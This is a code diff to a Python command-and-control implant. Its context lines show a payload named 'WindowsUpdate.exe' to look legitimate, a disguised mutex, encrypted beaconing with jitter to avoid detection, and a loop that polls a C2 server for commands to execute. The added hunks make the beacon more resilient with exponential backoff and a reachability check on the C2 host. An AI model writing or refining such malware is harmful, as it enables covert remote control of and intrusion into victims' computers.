@@ -22,6 +22,8 @@ PAYLOAD_NAME = "WindowsUpdate.exe"  # Renamed to look legitimate
 # === CONFIG ===
 C2_DOMAIN = os.getenv("C2_DOMAIN", "http://127.0.0.1:443").rstrip("/")  # Strip trailing slash to prevent double-slash URLs
 RETRY_DELAY = 30  # seconds
+RETRY_BACKOFF_MIN = 5   # minimum backoff when server is down
+RETRY_BACKOFF_MAX = 60  # maximum backoff when server is down
 POLLING_DELAY = 5  # Check for commands every N seconds
 JITTER = 2  # Random jitter +/- seconds added to polling
 MUTEX_NAME = "Global\\WindowsUpdateMutex"  # Prevent multiple instances
@@ -1046,14 +1048,28 @@ def execute_command(cmd):
 
 
 def connect_c2():
-    """Main C2 connection loop with encrypted comms and jitter"""
+    """Main C2 connection loop with encrypted comms, jitter, and exponential backoff"""
     print("[*] Starting C2 connection loop...")
     global client_id
+    backoff = RETRY_BACKOFF_MIN
 
     while True:
         try:
             # Random initial delay to avoid burst patterns (shorter on re-register)
             time.sleep(random.uniform(1, 2))
+
+            # Quick reachability check before full registration
+            try:
+                requests.get(f"{C2_DOMAIN}/test", timeout=5)
+            except Exception:
+                wait = min(backoff, RETRY_BACKOFF_MAX)
+                print(f"[!] Server unreachable — retrying in {wait}s...")
+                time.sleep(wait)
+                backoff = min(backoff * 2, RETRY_BACKOFF_MAX)
+                continue
+
+            # Server is up — reset backoff
+            backoff = RETRY_BACKOFF_MIN
 
             # Gather real system info (use session UA even for IP lookup)
             try:
@@ -1119,11 +1135,14 @@ def connect_c2():
                 time.sleep(max(1, POLLING_DELAY + jitter))
 
         except requests.exceptions.ConnectionError:
-            print(f"[!] Server unreachable — retrying in {RETRY_DELAY}s...")
-            time.sleep(RETRY_DELAY)
+            wait = min(backoff, RETRY_BACKOFF_MAX)
+            print(f"[!] Server unreachable — retrying in {wait}s...")
+            time.sleep(wait)
+            backoff = min(backoff * 2, RETRY_BACKOFF_MAX)
         except requests.exceptions.Timeout:
             print(f"[!] Request timed out — retrying in 5s...")
             time.sleep(5)
+            backoff = min(backoff * 2, RETRY_BACKOFF_MAX)
         except Exception:
             time.sleep(RETRY_DELAY)
 
